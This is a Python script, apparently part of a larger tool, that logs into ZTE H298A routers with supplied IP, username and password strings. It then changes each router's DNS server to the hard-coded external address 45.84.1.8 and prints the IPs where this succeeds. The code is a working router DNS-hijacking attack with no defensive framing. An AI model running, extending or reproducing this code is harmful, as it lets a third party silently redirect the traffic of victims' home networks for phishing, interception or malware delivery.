import re
import time
from hashlib import sha256

import requests

from shared import parse
from shared import TIMEOUT


# TODO NOT FINISHED
def zte_H298A(full_string):
    try:
        ip, username, password = parse(full_string)
    except ValueError:
        return False

    s = requests.Session()
    try:
        s.get(f'http://{ip}', timeout=TIMEOUT).raise_for_status()
        r = s.get(
            f'http://{ip}/function_module/login_module/login_page/logintoken_lua.lua?_={int(time.time() * 1000)}'
        )
        r.raise_for_status()
        token = re.findall(r'<ajax_response_xml_root>(\d+)</ajax_response_xml_root>', r.text)[0]
    except (requests.RequestException, IndexError):
        return False

    r = s.post(f'http://{ip}/', {
        'action': 'login',
        'Username': username,
        'Password': sha256((password + token).encode()).hexdigest(),
        'Frm_Logintoken': '',
    }, timeout=TIMEOUT)
    try:
        r.raise_for_status()
    except requests.RequestException:
        return False

    # TODO check login successs

    s.post(f'http://{ip}/common_page/Localnet_Dns_lua.lua', {
        'IF_ACTION': 'Apply',
        '_InstID': 'IGD',
        'SerIPAddress1': '45.84.1.8',
        'SerIPAddress2': '0.0.0.0',
        '_sessionTOKEN': '1952038884217670'  # TODO
    }).raise_for_status()

    print(ip)
    return True
